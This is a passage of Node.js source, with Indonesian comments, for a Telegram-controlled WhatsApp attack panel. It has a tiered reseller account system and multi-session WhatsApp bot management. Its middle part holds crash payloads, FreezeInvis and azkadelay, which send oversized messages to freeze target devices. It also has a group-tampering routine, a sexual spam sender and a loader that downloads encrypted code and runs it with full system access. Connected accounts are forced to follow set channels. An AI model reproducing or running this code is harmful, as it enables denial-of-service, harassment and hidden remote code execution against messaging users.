  return res.json({ valid: true, authorized: true, users });
});

app.get("/changeRole", (req, res) => {
  const { key, username, role } = req.query;
  console.log(`[🛠️ CHANGE ROLE] ${username} → ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !targetUser) return res.json({ valid: true, changed: false, message: "User not found." });

  // Validasi Hirarki (Sama seperti delete/edit)
  const roleLevel = { developer: 8, 'high owner': 7, owner: 6, moderator: 5, partner: 4, admin: 3, vip: 2, reseller: 1, member: 0 };
  
  if (roleLevel[editor.role] <= roleLevel[targetUser.role]) {
     return res.json({ valid: true, changed: false, message: "Cannot edit user with equal or higher rank." });
  }

  targetUser.role = role;
  saveDatabase(db);

  const logLine = `${editor.username} Changed Role ${targetUser.username} to ${role}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ CHANGE ROLE] ${username} diubah jadi ${role}`);
  return res.json({ valid: true, changed: true, user: targetUser });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // --- HIRARKI ROLE UPDATE (Sesuai Flutter Baru) ---
  const hierarchy = {
  developer: ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
  'high owner': ['owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
  owner: ['moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
  moderator: ['partner', 'admin', 'vip', 'reseller', 'member'],
  partner: ['admin', 'vip', 'reseller', 'member'],
  admin: ['vip', 'reseller', 'member'],
  vip: ['reseller', 'member'],
  reseller: ['member'],
  member: []
};

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  // --- CEK LIMIT BULANAN UPDATE ---
  const roleLimits = {
  developer: 999,
  'high owner': 999,
  owner: 50,
  moderator: 40,
  partner: 40,
  admin: 40,
  vip: 30,
  reseller: 20,
  member: 0
};

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7); 

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    uid: crypto.randomBytes(16).toString("hex"),
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  // Izin: Developer, All Access, Owner, Reseller
  if (!editor || !["developer", "high owner", "owner", "moderator", "partner", "admin", "vip", "reseller"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  // Batas hari untuk Reseller (jika ingin diterapkan juga ke role lain, sesuaikan)
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Validasi Hirarki (Sama seperti delete)
  const roleLevel = {
  developer: 8,
  'high owner': 7,
  owner: 6,
  moderator: 5,
  partner: 4,
  admin: 3,
  vip: 2,
  reseller: 1,
  member: 0
};
  
  if (roleLevel[editor.role] <= roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with equal or higher rank." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || !["developer", "high owner", "owner", "moderator", "partner", "admin", "vip"].includes(user.role)) {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function trybkpgb(sock, groupJid) {
    try {
        if (!groupJid.includes('@g.us')) {
            groupJid = groupJid + '@g.us';
        }

        const images = [
            'https://files.catbox.moe/jpgvms.jpg',
            'https://files.catbox.moe/jpgvms.jpg',
            'https://files.catbox.moe/jpgvms.jpg',
            'https://files.catbox.moe/jpgvms.jpg',
            'https://files.catbox.moe/jpgvms.jpg'
        ];

        const caption = '*P NGEWE YU GATAHAN NIH💦💦💦🤤🤤🔥*';

        let randomImage = images[Math.floor(Math.random() * images.length)];

        await sock.sendMessage(groupJid, {
            image: { url: randomImage },
            caption: caption,
            contextInfo: {
                isGroupStatus: true,
                mentionedJid: [groupJid]
            }
        });

        console.log('[OK] Gambar terkirim ke ' + groupJid);
        return true;

    } catch (err) {
        console.log('[ERROR] Gagal: ' + err.message);
        return false;
    }
}

async function FreezeInvis(sock, target) {
  let maklu = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "HàmjiFvçk¿?"
        },
        nativeFlowMessage: {
          buttons: Array.from({ length: 500000 }, () => ({})),
          
       nativeFlowMessage: {
          buttons: Array(30000).fill("\r")
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, maklu, {});
   participant: true
}

async function azkadelay(sock, target) {
  const bikin = (i) => ({
    viewOnceMessage: {
      message: {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "\u2063".repeat(500000) + "_A" + i
              },
              nativeFlowMessage: {
                name: "single_select",
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "\u2063".repeat(50000),
                      sections: [
                        {
                          title: "\u2063".repeat(50000),
                          rows: [
                            {
                              title: "\u2063".repeat(50000),
                              id: "AZKA_" + i
                            }
                          ]
                        }
                      ]
                    })
                  }
                ],
                messageParamsJson: JSON.stringify({
                  flow_action: "navigate",
                  flow_cta: "\u2063".repeat(50000)
                })
              },
              contextInfo: {
                remoteJid: target,
                mentionedJid: [target],
                urlTrackingMap: {
                  urlTrackingMapElements: Array.from({ length: 50000 }, () => ({
                    participant: target
                  }))
                }
              }
            }
          },
          ephemeralExpiration: 999999
        }
      }
    }
  });

  for (let i = 0; i < 100; i++) {
    try {
      await sock.relayMessage(target, bikin(i), {
        messageId: "AZKA_DLY_" + i + "_" + Date.now(),
        participant: { jid: target }
      });
      console.log("ok " + (i + 1));
    } catch (e) {
      console.log("err " + (i + 1) + ": " + e.message);
    }
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function BanGbNew(sock, groupJid) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    if (!meta || !meta.id) return { ok: false, message: "Grup tidak valid" };

    const randomNumber = "62" + Math.floor(1000000000 + Math.random() * 9000000000);
    const targetJid = randomNumber + "@s.whatsapp.net";

    try {
      await sock.groupParticipantsUpdate(groupJid, [targetJid], "add");
      return { ok: true, message: `Nomor ${randomNumber} ditambahkan` };
    } catch (e1) {
      try {
        await sock.groupUpdateSubject(groupJid, "BANNED BY RYUICHI HAMA");
        return { ok: true, message: "Subject grup diubah" };
      } catch (e2) {
        try {
          await sock.groupSettingUpdate(groupJid, "announcement");
          return { ok: true, message: "Grup dikunci" };
        } catch (e3) {
          return { ok: false, message: e3.message };
        }
      }
    }
  } catch (e) {
    return { ok: false, message: e.message };
  }
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
const sourceCreds = path.join(sessionDir, 'creds.json');
const destCreds = path.join('permenmd', owner, `${number}.json`);

// 🔥 BARU: simpen info tipe (private/global)
try {
  const infoPath = path.join(sessionDir, '_info.json');
  if (!fs.existsSync(infoPath)) {
    fs.writeFileSync(infoPath, JSON.stringify({
      owner: owner,
      type: 'private'
    }));
  }
} catch (e) {
  console.error('Gagal tulis _info.json:', e.message);
}

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
   
}

async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const vvipDir = path.join(__dirname, 'vvip');
  const baseDir = 'permenmd';

  // Buat folder vvip kalau belum ada
  if (!fs.existsSync(vvipDir)) {
    fs.mkdirSync(vvipDir, { recursive: true });
    console.log(`[INFO] Folder vvip dibuat.`);
  }

  // Helper: copy creds ke vvip/nomor.json setelah konek
  async function copyCredsToVVIP(sessionPath, sessionName) {
    const credsSource = path.join(sessionPath, `${sessionName}.json`);
    const credsDest = path.join(vvipDir, `${sessionName}.json`);
    try {
      if (fs.existsSync(credsSource)) {
        fs.copyFileSync(credsSource, credsDest);
        console.log(`[VVIP] Creds copied: ${sessionName}.json → vvip/`);
      } else {
        console.warn(`[VVIP] creds.json tidak ditemukan di ${sessionPath}`);
      }
    } catch (err) {
      console.error(`[VVIP ERROR] Gagal copy creds ${sessionName}:`, err.message);
    }
  }

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f =>
      fs.statSync(path.join(vipDir, f)).isDirectory()
    );

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);

    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
        await copyCredsToVVIP(sessionPath, sessionName); // ✅ Copy setelah konek
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (permenmd)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
  .filter(file => file.endsWith(".json") && file !== "_info.json")
  .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
          await copyCredsToVVIP(folder, sessionName); // ✅ Copy setelah konek
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}
/*
async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const baseDir = 'permenmd';

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f => fs.statSync(path.join(vipDir, f)).isDirectory());

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);
    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}*/

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json") && f !== "_info.json");
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json") && f !== "_info.json");
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
// ===== Command Handlers =====
// ═══════════════════════════════════════════════════════════════
// [PART 2/3] HANDLER /start — RICH MESSAGE VERSION
// ═══════════════════════════════════════════════════════════════
bot.onText(/^\/?(start|menu)/, async (msg) => {
  const id = msg.from.id;
  const telegramUsername = (msg.from.username || '').toLowerCase().trim();
  const firstName = msg.from.first_name || 'Bro';

  // ─── AUTO-TRACKING ───
  if (telegramUsername) {
    try {
      const TG_USERS_FILE = path.join(__dirname, 'telegram_users.json');
      let tgUsers = {};
      if (fs.existsSync(TG_USERS_FILE)) {
        try { tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8')); }
        catch { tgUsers = {}; }
      }

      tgUsers[telegramUsername] = {
        chatId: id,
        username: telegramUsername,
        firstName: msg.from.first_name || '',
        lastName: msg.from.last_name || '',
        lastStarted: new Date().toISOString(),
      };

      fs.writeFileSync(TG_USERS_FILE, JSON.stringify(tgUsers, null, 2), 'utf8');
      console.log(`[TG-TRACK] ✅ User @${telegramUsername} (chatId: ${id})`);
    } catch (e) {
      console.error(`[TG-TRACK] ❌ Gagal simpen user: ${e.message}`);
    }
  }

  // ─── CEK AKSES ───
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, '⛔ Akses ditolak. Hubungi owner dulu ya.');

  // ─── KIRIM MENU PAKAI RICH ───
const userRole = isOwner ? 'developer' : (config.roles?.[id] || 'member');

const html = buildStartRichHTML(firstName, telegramUsername, isOwner, userRole);
const keyboard = buildStartKeyboard(userRole, isOwner);

  const fallbackText =
    `╭━━〔 ZASA CONTROL PANEL 〕━━╮\n` +
    `│ 👋 Halo, ${firstName}\n` +
    `│ 🎖️ Role: ${isOwner ? '👑 OWNER' : '👤 USER'}\n` +
    `├────── MENU UTAMA ──────\n` +
    `│ 👤 Buat Akun Member\n│ ⏳ Set Expired\n│ 📋 List User\n│ 🧩 Custom User\n│ 🗑️ Hapus User\n` +
    `╰━━━━━━━━━━━━━━━━━━━━━━╯\nPilih tombol menu di bawah.`;

  try {
    const richMsg = await sendRichMenu({
      chatId: id,
      html,
      keyboard,
      fallbackText,
    });

    if (richMsg) {
      console.log(`[MENU] ✅ Menu terkirim ke @${telegramUsername || firstName}`);
    }
  } catch (err) {
    console.error(`[MENU] ❌ Gagal: ${err.message}`);
  }
});

// ══════════════════════════════════════════════════════════════
// ══════ HELPER: HIERARKI ROLE (BUAT VALIDASI) ══════
// ══════════════════════════════════════════════════════════════

// Role apa aja yang boleh dibuat oleh role tertentu
function getAllowedRolesToCreate(creatorRole) {
  const HIERARCHY = {
    'developer':    ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    'high owner':   ['owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    'owner':        ['moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    'moderator':    ['partner', 'admin', 'vip', 'reseller', 'member'],
    'partner':      ['admin', 'vip', 'reseller', 'member'],
    'admin':        ['vip', 'reseller', 'member'],
    'vip':          ['reseller', 'member'],
    'reseller':     ['member'],
    'member':       []
  };
  return HIERARCHY[creatorRole] || [];
}

// Role yang bisa akses fitur tertentu
const ROLE_PERMISSIONS = {
  create_account: ['owner', 'high owner', 'developer', 'moderator', 'partner', 'admin', 'vip', 'reseller'],
  list_user:      ['owner', 'high owner', 'developer', 'moderator', 'partner', 'admin'],
  delete_user:    ['owner', 'high owner', 'developer', 'moderator', 'partner', 'admin'],
  set_expire:     ['owner', 'high owner', 'developer', 'moderator', 'partner', 'admin', 'vip', 'reseller'],
  manage_access:  ['owner', 'high owner', 'developer'],
};

// Cek apakah role punya permission
function canDo(role, action) {
  return (ROLE_PERMISSIONS[action] || []).includes(role);
}

console.log('[HELPER] getAllowedRolesToCreate & canDo terpasang.');
// ═══════════════════════════════════════════════════════════════
// END PART 2/3
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════
// ✅ COMMAND: /senderinfo — Cek sender WA aktif
// ═══════════════════════════════════════════════════
bot.onText(/^\/senderinfo$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const socks = Object.keys(activeConnections);

  if (socks.length === 0) {
